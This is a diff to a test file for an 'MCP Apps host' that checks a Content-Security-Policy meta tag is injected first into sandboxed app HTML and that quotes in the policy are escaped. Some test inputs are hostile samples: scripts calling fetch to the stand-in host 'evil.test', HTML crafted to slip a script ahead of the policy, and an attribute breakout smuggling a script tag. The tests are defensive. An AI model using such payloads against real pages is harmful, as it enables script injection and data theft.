@@ -42,9 +42,34 @@ describe('MCP Apps host', () => {
   it('sandboxes the app and injects a restrictive CSP', async () => {
     const { iframe } = await setup()
     expect(iframe.getAttribute('sandbox')).toBe('allow-scripts allow-forms')
-    expect(iframe.srcdoc).toContain(`<head><meta http-equiv="Content-Security-Policy" content="default-src 'none'`)
+    expect(iframe.srcdoc).toMatch(/^<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src 'none'/)
     expect(buildCsp({ connectDomains: ['https://api.x'] })).toContain('connect-src https://api.x')
-    expect(withCsp('<p>bare</p>', 'x')).toBe('<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="x"></head><body><p>bare</p></body></html>')
+    expect(withCsp('<p>bare</p>', 'x')).toBe('<!doctype html><meta http-equiv="Content-Security-Policy" content="x"><p>bare</p>')
+  })
+
+  // The policy only covers what the parser reads after it, and a CSP <meta> outside <head> is ignored.
+  it.each([
+    ['a fragment', '<p>hi</p><script>fetch("https://evil.test")</script>'],
+    ['a full document', '<!DOCTYPE html><html lang="en"><head><title>t</title><script>1</script></head><body></body></html>'],
+    ['comments before the doctype', '<!-- app --><!doctype html><html><head><script>1</script></head></html>'],
+    ['<head> inside a comment', '<!-- <head> --><script>fetch("https://evil.test")</script><head></head>'],
+    ['<html> inside a comment', '<!-- <html> --><script>1</script>'],
+    ['a script before <head>', '<html><script>1</script><head></head><body></body></html>'],
+    ['a <header> before <head>', '<header>h</header><script>1</script><head></head>'],
+    ['<head> in a script string', '<script>const s = "<head>"</script><head></head>'],
+    ['upper-case tags', '<HTML><HEAD><SCRIPT>1</SCRIPT></HEAD></HTML>'],
+    ['its own looser policy', '<head><meta http-equiv="Content-Security-Policy" content="default-src *"><script>1</script></head>'],
+  ])('puts the policy before anything else in %s', (_, html) => {
+    const doc = new DOMParser().parseFromString(withCsp(html, "default-src 'none'"), 'text/html')
+    const first = doc.querySelector('head > *, body *')
+    expect(first?.outerHTML).toBe(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`)
+    expect(doc.compatMode).toBe('CSS1Compat')
+  })
+
+  it('escapes quotes in the policy', () => {
+    const doc = new DOMParser().parseFromString(withCsp('<p>x</p>', `img-src "a"><script>1</script>`), 'text/html')
+    expect(doc.querySelector('meta')!.getAttribute('content')).toBe(`img-src "a"><script>1</script>`)
+    expect(doc.querySelectorAll('script')).toHaveLength(0)
   })
 
   it('initializes, then delivers tool input and result only after initialized', async () => {
